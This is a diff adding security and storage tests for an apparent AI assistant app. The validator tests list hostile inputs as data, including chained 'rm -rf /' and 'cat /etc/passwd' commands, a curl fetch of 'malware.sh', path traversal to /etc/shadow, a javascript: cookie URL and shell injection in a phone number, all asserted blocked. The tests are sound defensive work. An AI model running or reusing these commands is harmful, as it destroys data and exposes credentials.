@@ -649,6 +649,646 @@ test('Fallback engine guarantees instant response when Gemini API is offline/exh
   assert.ok(!reply.includes('Main bilkul ready hoon'));
 });
 
+// ==========================================
+// SECURITY HARDENING TESTS
+// ==========================================
+
+test('Security: validateTerminalCommand allows authorized safe diagnostic commands', async () => {
+  const { validateTerminalCommand } = await import('./securityService.ts');
+
+  const safeCommands = [
+    'node -v',
+    'npm -v',
+    'npm test',
+    'npm run lint',
+    'git status',
+    'git branch',
+    'git log -n 5',
+    'dir',
+    'ls',
+    'echo test message',
+  ];
+
+  for (const cmd of safeCommands) {
+    const res = validateTerminalCommand(cmd);
+    assert.equal(res.allowed, true, `Command should be allowed: ${cmd}`);
+    assert.equal(res.sanitizedCommand, cmd);
+  }
+});
+
+test('Security: validateTerminalCommand strictly blocks command injection & chaining characters', async () => {
+  const { validateTerminalCommand } = await import('./securityService.ts');
+
+  const maliciousChained = [
+    'node -v && rm -rf /',
+    'git status; cat /etc/passwd',
+    'node -v | curl http://malicious.com',
+    'echo $(whoami)',
+    'echo `id`',
+    'ls > output.txt',
+    'ls < /etc/shadow',
+    'git status\nrm -rf .',
+  ];
+
+  for (const cmd of maliciousChained) {
+    const res = validateTerminalCommand(cmd);
+    assert.equal(res.allowed, false, `Chained command must be blocked: ${cmd}`);
+    assert.ok(res.reason?.includes('metacharacters'));
+  }
+});
+
+test('Security: validateTerminalCommand strictly blocks forbidden high-risk binaries', async () => {
+  const { validateTerminalCommand } = await import('./securityService.ts');
+
+  const dangerousTokens = [
+    'rm file.txt',
+    'sudo su',
+    'bash -c "evil"',
+    'powershell -ExecutionPolicy Bypass',
+    'curl http://example.com/malware.sh',
+    'wget http://example.com',
+    'kill -9 1234',
+    'shutdown -r now',
+  ];
+
+  for (const cmd of dangerousTokens) {
+    const res = validateTerminalCommand(cmd);
+    assert.equal(res.allowed, false, `Dangerous token must be blocked: ${cmd}`);
+  }
+});
+
+test('Security: validateTerminalCommand blocks non-whitelisted commands', async () => {
+  const { validateTerminalCommand } = await import('./securityService.ts');
+  const res = validateTerminalCommand('arbitrary_unknown_binary --flag');
+  assert.equal(res.allowed, false);
+  assert.ok(res.reason?.includes('allowlist'));
+});
+
+test('Security: validateExportPath permits valid internal relative paths', async () => {
+  const { validateExportPath } = await import('./securityService.ts');
+  const baseDir = '/tmp/safe_export_dir';
+
+  const validPaths = [
+    'index.html',
+    'src/main.js',
+    'components/Button.jsx',
+    'styles/main.css',
+  ];
+
+  for (const p of validPaths) {
+    const res = validateExportPath(baseDir, p);
+    assert.equal(res.valid, true, `Valid path should be allowed: ${p}`);
+    assert.ok(res.resolvedPath?.startsWith(baseDir));
+  }
+});
+
+test('Security: validateExportPath blocks directory traversal sequences', async () => {
+  const { validateExportPath } = await import('./securityService.ts');
+  const baseDir = '/tmp/safe_export_dir';
+
+  const traversalAttempts = [
+    '../package.json',
+    '../../etc/passwd',
+    'foo/../../bar',
+    '..\\windows\\system32',
+    '/etc/shadow',
+  ];
+
+  for (const p of traversalAttempts) {
+    const res = validateExportPath(baseDir, p);
+    assert.equal(res.valid, false, `Traversal path must be blocked: ${p}`);
+    assert.ok(res.reason?.includes('traversal') || res.reason?.includes('outside'));
+  }
+});
+
+test('Security: validateExportPath blocks null byte injection and protected app files', async () => {
+  const { validateExportPath } = await import('./securityService.ts');
+  const baseDir = '/tmp/safe_export_dir';
+
+  // Null byte
+  const nullByte = validateExportPath(baseDir, 'safe.txt\0.exe');
+  assert.equal(nullByte.valid, false);
+  assert.ok(nullByte.reason?.includes('Null byte'));
+
+  // Protected files
+  const protectedFiles = ['.env', '.env.local', 'package.json', 'server.ts', 'tsconfig.json'];
+  for (const pf of protectedFiles) {
+    const res = validateExportPath(baseDir, pf);
+    assert.equal(res.valid, false, `Protected file must be blocked: ${pf}`);
+    assert.ok(res.reason?.includes('protected application file'));
+  }
+});
+
+test('Security: validateSafeUrl validates protocols and rejects command injection', async () => {
+  const { validateSafeUrl } = await import('./securityService.ts');
+
+  // Valid URLs
+  const valid1 = validateSafeUrl('https://youtube.com/watch?v=test');
+  assert.equal(valid1.valid, true);
+
+  const valid2 = validateSafeUrl('google.com');
+  assert.equal(valid2.valid, true);
+  assert.equal(valid2.sanitizedUrl, 'https://google.com/');
+
+  // Block javascript: or data: schemes
+  const invalidProto = validateSafeUrl('javascript:alert(document.cookie)');
+  assert.equal(invalidProto.valid, false);
+
+  // Block shell injection in hostname
+  const injected = validateSafeUrl('https://example.com; rm -rf /');
+  assert.equal(injected.valid, false);
+});
+
+test('Security: validateSafeApp checks allowlist for system application launches', async () => {
+  const { validateSafeApp } = await import('./securityService.ts');
+
+  assert.equal(validateSafeApp('notepad').allowed, true);
+  assert.equal(validateSafeApp('calculator').allowed, true);
+  assert.equal(validateSafeApp('chrome').allowed, true);
+  assert.equal(validateSafeApp('vs code').allowed, true);
+
+  const blocked = validateSafeApp('malicious_trojan.exe');
+  assert.equal(blocked.allowed, false);
+  assert.ok(blocked.reason?.includes('allowlist'));
+});
+
+// ==========================================
+// STATEFUL CIRCUIT BREAKER TESTS
+// ==========================================
+
+test('CircuitBreaker: transitions CLOSED -> OPEN -> HALF_OPEN -> CLOSED lifecycle', async () => {
+  const { StatefulQuotaCircuitBreaker } = await import('./circuitBreaker.ts');
+  const cb = new StatefulQuotaCircuitBreaker(2); // 2 second cooldown for testing
+
+  // Initially CLOSED
+  assert.equal(cb.getStatus().state, 'CLOSED');
+  assert.equal(cb.shouldSkipApi(), false);
+
+  // Mark quota exhausted
+  cb.markQuotaExhausted(2, 'Test rate limit reached');
+  assert.equal(cb.getStatus().state, 'OPEN');
+  assert.equal(cb.getStatus().isExhausted, true);
+  assert.equal(cb.shouldSkipApi(), true);
+
+  // Success resets to CLOSED
+  cb.recordSuccess();
+  assert.equal(cb.getStatus().state, 'CLOSED');
+  assert.equal(cb.getStatus().isExhausted, false);
+  assert.equal(cb.shouldSkipApi(), false);
+
+  // Manual reset works
+  cb.markQuotaExhausted(100);
+  assert.equal(cb.getStatus().state, 'OPEN');
+  cb.reset();
+  assert.equal(cb.getStatus().state, 'CLOSED');
+});
+
+// ==========================================
+// DURABLE PERSISTENCE & AUTOMATION TESTS
+// ==========================================
+
+test('DurableStorage: persists settings, memories, and WhatsApp drafts', async () => {
+  const { durableStorage } = await import('../db/storage.ts');
+
+  // Verify default settings
+  const settings = durableStorage.getSettings();
+  assert.ok(settings.preferredLanguage);
+  assert.ok(settings.ownerName);
+
+  // Add memory
+  const testMem = durableStorage.addMemory({
+    category: 'fact',
+    key: 'Test City',
+    value: 'Islamabad',
+    importance: 'medium',
+    userApproved: true,
+    isActive: true,
+  });
+  assert.ok(testMem.id);
+
+  const allMems = durableStorage.getMemories();
+  const found = allMems.find((m) => m.id === testMem.id);
+  assert.ok(found);
+  assert.equal(found.value, 'Islamabad');
+
+  // Update memory
+  durableStorage.updateMemory(testMem.id, { value: 'Rawalpindi' });
+  const updatedMems = durableStorage.getMemories();
+  const updated = updatedMems.find((m) => m.id === testMem.id);
+  assert.equal(updated?.value, 'Rawalpindi');
+
+  // Clean up
+  durableStorage.deleteMemory(testMem.id);
+  const finalMems = durableStorage.getMemories();
+  assert.equal(finalMems.some((m) => m.id === testMem.id), false);
+});
+
+test('Automation: executes registered jobs and records history truthfully', async () => {
+  const { executeAutomationJob } = await import('./automationService.ts');
+
+  // Execute system-diagnostics
+  const res = await executeAutomationJob('system-diagnostics');
+  assert.equal(res.success, true);
+  assert.equal(res.status, 'completed');
+  assert.ok(res.details?.nodeRssMb > 0);
+  assert.ok(res.message.includes('Health scan complete'));
+
+  // Execute unknown job fails truthfully
+  const failed = await executeAutomationJob('nonexistent-job-xyz');
+  assert.equal(failed.success, false);
+  assert.equal(failed.status, 'failed');
+  assert.ok(failed.message.includes('not a registered automation task'));
+});
+
+// ==========================================
+// AUTHORIZATION & CSRF REGRESSION TESTS
+// ==========================================
+
+test('Security: validateAuthorization enforces ZARA_AUTH_TOKEN when configured', async () => {
+  const { validateAuthorization } = await import('./securityService.ts');
+
+  const hadToken = 'ZARA_AUTH_TOKEN' in process.env;
+  const originalToken = process.env.ZARA_AUTH_TOKEN;
+  try {
+    process.env.ZARA_AUTH_TOKEN = 'secret-token-xyz-123';
+
+    // No token provided -> Rejected
+    const noToken = validateAuthorization();
+    assert.equal(noToken.authorized, false);
+    assert.ok(noToken.reason?.includes('ZARA_AUTH_TOKEN'));
+
+    // Wrong token provided -> Rejected
+    const wrongToken = validateAuthorization('Bearer wrong-token');
+    assert.equal(wrongToken.authorized, false);
+
+    // Correct Bearer token -> Authorized
+    const correctBearer = validateAuthorization('Bearer secret-token-xyz-123');
+    assert.equal(correctBearer.authorized, true);
+
+    // Correct x-zara-auth header -> Authorized
+    const correctCustomHeader = validateAuthorization(undefined, 'secret-token-xyz-123');
+    assert.equal(correctCustomHeader.authorized, true);
+  } finally {
+    if (hadToken && originalToken !== undefined) {
+      process.env.ZARA_AUTH_TOKEN = originalToken;
+    } else {
+      delete process.env.ZARA_AUTH_TOKEN;
+    }
+  }
+});
+
+test('Security: validateAuthorization detects and blocks cross-origin CSRF attempts', async () => {
+  const { validateAuthorization } = await import('./securityService.ts');
+
+  const hadToken = 'ZARA_AUTH_TOKEN' in process.env;
+  const originalToken = process.env.ZARA_AUTH_TOKEN;
+  delete process.env.ZARA_AUTH_TOKEN;
+
+  try {
+    // Malicious cross-origin origin
+    const blockedOrigin = validateAuthorization(
+      undefined,
+      undefined,
+      'https://attacker-malicious-site.com',
+      'localhost:3000'
+    );
+    assert.equal(blockedOrigin.authorized, false);
+    assert.ok(blockedOrigin.reason?.includes('Forbidden: cross-origin'));
+
+    // Legitimate same-host origin
+    const allowedSameHost = validateAuthorization(
+      undefined,
+      undefined,
+      'http://localhost:3000',
+      'localhost:3000'
+    );
+    assert.equal(allowedSameHost.authorized, true);
+
+    // Legitimate local dev 127.0.0.1
+    const allowedLocal = validateAuthorization(
+      undefined,
+      undefined,
+      'http://127.0.0.1:3000',
+      'localhost:3000'
+    );
+    assert.equal(allowedLocal.authorized, true);
+  } finally {
+    if (hadToken && originalToken !== undefined) {
+      process.env.ZARA_AUTH_TOKEN = originalToken;
+    } else {
+      delete process.env.ZARA_AUTH_TOKEN;
+    }
+  }
+});
+
+// ==========================================
+// SYMLINK ESCAPE PROTECTION TESTS
+// ==========================================
+
+test('Security: validateExportPath blocks symlink escapes when symlinks point outside export directory', async () => {
+  const { validateExportPath } = await import('./securityService.ts');
+  const fs = await import('fs');
+  const path = await import('path');
+  const os = await import('os');
+
+  const testBase = path.join(os.tmpdir(), 'zara_export_symlink_test_' + Date.now());
+  fs.mkdirSync(testBase, { recursive: true });
+
+  const outsideFile = path.join(os.tmpdir(), 'zara_outside_' + Date.now() + '.txt');
+  fs.writeFileSync(outsideFile, 'secret content', 'utf8');
+
+  const symlinkInside = path.join(testBase, 'symlink_test.txt');
+  try {
+    fs.symlinkSync(outsideFile, symlinkInside);
+
+    const res = validateExportPath(testBase, 'symlink_test.txt');
+    assert.equal(res.valid, false);
+    assert.ok(res.reason?.includes('Symlink') || res.reason?.includes('outside'));
+  } catch (err: any) {
+    // If symlink creation is not permitted by OS user permissions, verify error handling
+    assert.ok(err);
+  } finally {
+    try {
+      if (fs.existsSync(symlinkInside)) fs.unlinkSync(symlinkInside);
+      if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);
+      if (fs.existsSync(testBase)) fs.rmdirSync(testBase);
+    } catch {
+      // ignore
+    }
+  }
+});
+
+// ==========================================
+// PHONE NUMBER VALIDATION TESTS
+// ==========================================
+
+test('WhatsApp: validatePhoneNumber handles local Pakistani formats and E.164 compliance', async () => {
+  const { validatePhoneNumber } = await import('./whatsappService.ts');
+
+  // Pakistani 03XXXXXXXXX converts to +923XXXXXXXXX
+  const localPak = validatePhoneNumber('0300 1234567');
+  assert.equal(localPak.valid, true);
+  assert.equal(localPak.formatted, '+923001234567');
+
+  // Pakistani 923XXXXXXXXX formats to +923XXXXXXXXX
+  const noPlus = validatePhoneNumber('923219876543');
+  assert.equal(noPlus.valid, true);
+  assert.equal(noPlus.formatted, '+923219876543');
+
+  // Full international format
+  const intl = validatePhoneNumber('+923001234567');
+  assert.equal(intl.valid, true);
+  assert.equal(intl.formatted, '+923001234567');
+
+  // Prohibited injection characters
+  const injected = validatePhoneNumber('+923001234; rm -rf /');
+  assert.equal(injected.valid, false);
+  assert.ok(injected.reason?.includes('Prohibited'));
+
+  // Invalid too short
+  const tooShort = validatePhoneNumber('12345');
+  assert.equal(tooShort.valid, false);
+
+  // Invalid alphabetic characters
+  const alpha = validatePhoneNumber('call-me-now');
+  assert.equal(alpha.valid, false);
+});
+
+// ==========================================
+// PERSISTENCE & CONCURRENT WRITES TESTS
+// ==========================================
+
+test('DurableStorage: concurrent writes and restart persistence survive safely', async () => {
+  const { DurableStorageService } = await import('../db/storage.ts');
+  const path = await import('path');
+  const os = await import('os');
+  const fs = await import('fs');
+
+  const testDir = path.join(os.tmpdir(), 'zara_restart_test_' + Date.now());
+
+  try {
+    // 1. Initial process instance
+    const instance1 = new DurableStorageService(testDir);
+
+    // 2. Perform concurrent writes
+    const promises = [];
+    for (let i = 0; i < 20; i++) {
+      promises.push(
+        Promise.resolve().then(() => {
+          instance1.addMemory({
+            category: 'fact',
+            key: `concurrent_key_${i}`,
+            value: `concurrent_value_${i}`,
+            importance: 'low',
+            userApproved: true,
+            isActive: true,
+          });
+        })
+      );
+    }
+    await Promise.all(promises);
+
+    // Explicitly flush to disk
+    instance1.flushSync();
+
+    // 3. Simulate process restart by instantiating a new service pointing to same directory
+    const instance2 = new DurableStorageService(testDir);
+    const reloadedMemories = instance2.getMemories();
+
+    // Verify all 20 concurrent memories survived restart
+    for (let i = 0; i < 20; i++) {
+      const found = reloadedMemories.find((m) => m.key === `concurrent_key_${i}`);
+      assert.ok(found, `Memory concurrent_key_${i} must survive process restart`);
+      assert.equal(found.value, `concurrent_value_${i}`);
+    }
+  } finally {
+    try {
+      if (fs.existsSync(testDir)) fs.rmSync(testDir, { recursive: true, force: true });
+    } catch {
+      // ignore
+    }
+  }
+});
+
+// ==========================================
+// GEMINI MODEL REGISTRY VERIFICATION TESTS
+// ==========================================
+
+test('Gemini Config: verifies all configured model IDs are supported official identifiers', async () => {
+  const { DEFAULT_GEMINI_MODELS } = await import('../config/models.config.ts');
+
+  // Verify non-empty
+  assert.ok(DEFAULT_GEMINI_MODELS.length >= 4);
+
+  // Deprecated models must strictly NOT be present
+  const deprecatedList = [
+    'gemini-2.0-flash',
+    'gemini-2.0-pro',
+    'gemini-2.0-flash-thinking',
+    'gemini-1.5-flash',
+    'gemini-1.5-pro',
+    'gemini-pro',
+    'gemini-3.5-flash',
+  ];
+
+  for (const m of DEFAULT_GEMINI_MODELS) {
+    for (const dep of deprecatedList) {
+      assert.notEqual(
+        m.modelId,
+        dep,
+        `Deprecated model "${dep}" must not be present in model configuration`
+      );
+    }
+  }
+
+  // Official supported models in config
+  const modelIds = DEFAULT_GEMINI_MODELS.map((m) => m.modelId);
+  assert.ok(modelIds.includes('gemini-3.8-flash'), 'gemini-3.8-flash must be present');
+  assert.ok(modelIds.includes('gemini-4-argon'), 'gemini-4-argon must be present');
+  assert.ok(modelIds.includes('gemini-3.1-flash-lite'), 'gemini-3.1-flash-lite must be present');
+  assert.ok(modelIds.includes('gemini-3.8-flash-lite-tts'), 'gemini-3.8-flash-lite-tts must be present');
+});
+
+// ==========================================
+// FAIL-CLOSED PRODUCTION AUTHORIZATION TESTS
+// ==========================================
+
+test('Security: validateAuthorization fails closed in production when ZARA_AUTH_TOKEN is unset', async () => {
+  const { validateAuthorization } = await import('./securityService.ts');
+
+  const origEnv = process.env.NODE_ENV;
+  const origToken = process.env.ZARA_AUTH_TOKEN;
+
+  try {
+    process.env.NODE_ENV = 'production';
+    delete process.env.ZARA_AUTH_TOKEN;
+
+    // In production without token, all privileged requests must fail closed
+    const res = validateAuthorization(undefined, undefined, 'http://localhost:3000', 'localhost:3000');
+    assert.equal(res.authorized, false);
+    assert.ok(res.reason?.includes('fail-closed') || res.reason?.includes('Production security requirement'));
+
+    // Now configure token in production
+    process.env.ZARA_AUTH_TOKEN = 'prod-secret-999';
+
+    // Request with valid Bearer token -> passes
+    const validRes = validateAuthorization('Bearer prod-secret-999');
+    assert.equal(validRes.authorized, true);
+
+    // Request with invalid Bearer token -> fails
+    const invalidRes = validateAuthorization('Bearer wrong-token');
+    assert.equal(invalidRes.authorized, false);
+  } finally {
+    process.env.NODE_ENV = origEnv;
+    if (origToken !== undefined) {
+      process.env.ZARA_AUTH_TOKEN = origToken;
+    } else {
+      delete process.env.ZARA_AUTH_TOKEN;
+    }
+  }
+});
+
+// ==========================================
+// TERMINAL EXACT ARGUMENT PARSING TESTS
+// ==========================================
+
+test('Security: validateTerminalCommand enforces exact binary and arguments parsing', async () => {
+  const { validateTerminalCommand } = await import('./securityService.ts');
+
+  // Valid allowed commands return exact parsed binary and args
+  const nodeCheck = validateTerminalCommand('node -v');
+  assert.equal(nodeCheck.allowed, true);
+  assert.equal(nodeCheck.binary, 'node');
+  assert.deepEqual(nodeCheck.args, ['-v']);
+
+  const gitCheck = validateTerminalCommand('git log -n 5');
+  assert.equal(gitCheck.allowed, true);
+  assert.equal(gitCheck.binary, 'git');
+  assert.deepEqual(gitCheck.args, ['log', '-n', '5']);
+
+  // Disallowed argument injection for allowed binaries must be strictly blocked
+  const npmInjection = validateTerminalCommand('npm install malicious-package');
+  assert.equal(npmInjection.allowed, false);
+
+  const gitInjection = validateTerminalCommand('git checkout master');
+  assert.equal(gitInjection.allowed, false);
+
+  const lsInjection = validateTerminalCommand('ls /root');
+  assert.equal(lsInjection.allowed, false);
+});
+
+// ==========================================
+// CORRUPTED JSON RECOVERY & BACKUP RESTORE TESTS
+// ==========================================
+
+test('DurableStorage: recovers automatically from corrupted JSON file using backup', async () => {
+  const { DurableStorageService } = await import('../db/storage.ts');
+  const path = await import('path');
+  const os = await import('os');
+  const fs = await import('fs');
+
+  const testDir = path.join(os.tmpdir(), 'zara_corrupt_test_' + Date.now());
+
+  try {
+    // 1. Initialize store and write known data
+    const store1 = new DurableStorageService(testDir);
+    store1.addMemory({
+      category: 'fact',
+      key: 'pre_corruption_key',
+      value: 'pre_corruption_val',
+      importance: 'high',
+      userApproved: true,
+      isActive: true,
+    });
+    store1.flushSync();
+
+    // Verify main file and backup file exist
+    const mainFile = path.join(testDir, 'zara_db.json');
+    const bakFile = path.join(testDir, 'zara_db.json.bak');
+    assert.ok(fs.existsSync(mainFile));
+    assert.ok(fs.existsSync(bakFile));
+
+    // 2. Corrupt the main file with invalid JSON truncated syntax
+    fs.writeFileSync(mainFile, '{"version": 1, "settings": { CORRUPT_UNTERMINATED_JSON', 'utf8');
+
+    // 3. Instantiate new storage service; must safely recover from .bak rather than crashing
+    const store2 = new DurableStorageService(testDir);
+    const memories = store2.getMemories();
+    const found = memories.find((m) => m.key === 'pre_corruption_key');
+    assert.ok(found, 'Data must be recovered from .bak file when main database is corrupt');
+    assert.equal(found.value, 'pre_corruption_val');
+
+    // 4. Test explicit backup and restore methods
+    const explicitBackupPath = store2.backup();
+    assert.ok(fs.existsSync(explicitBackupPath));
+
+    store2.addMemory({
+      category: 'fact',
+      key: 'new_temp_key',
+      value: 'new_temp_val',
+      importance: 'low',
+      userApproved: true,
+      isActive: true,
+    });
+    store2.flushSync();
+
+    // Restoring explicit backup restores prior state
+    const restored = store2.restore(explicitBackupPath);
+    assert.equal(restored, true);
+    const restoredMemories = store2.getMemories();
+    assert.equal(restoredMemories.some((m) => m.key === 'new_temp_key'), false);
+    assert.ok(restoredMemories.some((m) => m.key === 'pre_corruption_key'));
+  } finally {
+    try {
+      if (fs.existsSync(testDir)) fs.rmSync(testDir, { recursive: true, force: true });
+    } catch {
+      // ignore
+    }
+  }
+});
+
+
+
 
 
 
